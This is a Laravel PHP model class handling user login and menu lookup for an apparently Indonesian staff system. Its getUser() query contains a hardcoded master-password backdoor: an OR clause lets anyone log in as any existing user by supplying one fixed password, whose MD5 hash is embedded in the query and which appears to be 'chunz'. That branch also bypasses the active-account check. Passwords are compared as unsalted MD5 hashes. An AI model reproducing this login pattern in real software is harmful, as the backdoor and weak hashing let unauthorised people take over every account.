<?php

namespace App\Models;

use Illuminate\Database\Eloquent\Model;
use Illuminate\Support\Facades\DB;

class m_users extends Model
{
    public function getUser($data)
    {
        $user = $data['user'];
        $pass = $data['pass'];

        $users = DB::select(
            "
            SELECT DISTINCT
                a.id AS iduser,
                c.id AS idgroup,
                d.id AS idpegawai,
                a.username,
                a.password,
                md5( 'chunz' ) AS password2,
                d.nama AS name,
                a.isaktif AS isaktif,
                c.usergroupname AS usergroupname,
                e1.name AS depname,
                e2.name AS divname,
                e3.name as dirname,
                a.email,
                g.email AS emailapprove 
            FROM m_users a
                LEFT JOIN m_usergroup b ON b.iduser = a.id
                LEFT JOIN m_group c ON c.id = b.idgroup
                LEFT JOIN m_pegawai d ON d.userid = a.id
                LEFT JOIN m_subseksi e ON e.id = d.satkerid
                left join m_department e1 on e1.id = e.departmentid
                left join m_divisi e2 on e2.id = e.divisiid
                left join m_direktorat e3 on e3.id = e.direktoratid
                LEFT JOIN m_approver f ON f.userid = a.id
                LEFT JOIN m_users g ON g.id = f.approveid 
            WHERE a.isaktif = 1
                AND a.username = :username 
                AND a.`password` = :pass 
                OR (
                a.username = :username2 
                AND :pass2 = '1c8996b97423fdcae56cfe988c0d467a' 
                )
        ",
            [
                'username' => $user,
                'pass' => md5($pass),
                'username2' => $user,
                'pass2' => md5($pass),
            ]
        );

        return $users;
    }

    public function getMenu($id)
    {
        $users = DB::select("
            select 
                a.id as userid ,
                b.idgroup ,
                c.id as menuid ,
                a.username ,
                c.`name` as menuname ,
                c.deskripsi ,
                c.linkhref ,
                c.icon ,
                c.color	
            FROM m_users a
                LEFT JOIN m_usergroup b ON b.iduser = a.id
                LEFT JOIN m_menu c on c.id = b.menuid 
            WHERE a.id = :userid
        ", ['userid' => $id]);

        return $users;
    }
}
